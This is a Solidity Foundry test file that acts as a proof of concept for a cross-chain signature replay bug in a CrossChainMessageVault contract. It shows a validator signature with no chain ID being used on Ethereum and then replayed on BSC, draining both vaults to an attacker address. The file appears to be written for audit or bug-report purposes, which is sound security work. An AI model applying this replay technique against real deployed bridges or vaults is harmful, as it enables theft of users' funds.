//SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import "../src/CrossChainMessageVault.sol";

contract CrossChainMessageVaultTest is Test {
    using ECDSA for bytes32;

    CrossChainMessageVault public ethVault;
    CrossChainMessageVault public bscVault;

    uint256 internal immutable VALIDATOR_KEY = 0x7A21B;
    address public validator;
    address public attacker;

    function setUp() public {
        validator = vm.addr(VALIDATOR_KEY);
        attacker = makeAddr("ATTACKER_NODE");

        ethVault = new CrossChainMessageVault{value: 10 ether}(validator);
        bscVault = new CrossChainMessageVault{value: 10 ether}(validator);
    }

    function test_CrossChainMessageReplayExploit() public {
        uint256 withdrawAmount = 10 ether;
        uint256 txNonce = 1337;

        vm.chainId(1);

        bytes32 msgHashEth = keccak256(abi.encodePacked(attacker, withdrawAmount, txNonce));
        bytes32 ethSignedHash = MessageHashUtils.toEthSignedMessageHash(msgHashEth);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(VALIDATOR_KEY, ethSignedHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.prank(attacker);
        ethVault.executeCrossChainWithdrawal(attacker, withdrawAmount, txNonce, signature);
        assertEq(address(ethVault).balance, 0);

        vm.chainId(56);

        uint256 bscInitialBalance = address(bscVault).balance;

        vm.prank(attacker);
        bscVault.executeCrossChainWithdrawal(attacker, withdrawAmount, txNonce, signature);

        uint256 bscFinalBalance = address(bscVault).balance;
        uint256 concreteLoss = bscInitialBalance - bscFinalBalance;

        console.log("=== REPORT-GRADE POC LOGS ===");
        console.log("BSC Target Vault Initial Balance :", bscInitialBalance);
        console.log("BSC Target Vault Final Balance   :", bscFinalBalance);
        console.log("Replayed Cross-Chain Loss        :", concreteLoss);

        assertEq(bscFinalBalance, 0);
        assertEq(attacker.balance, 20 ether);
    }
}
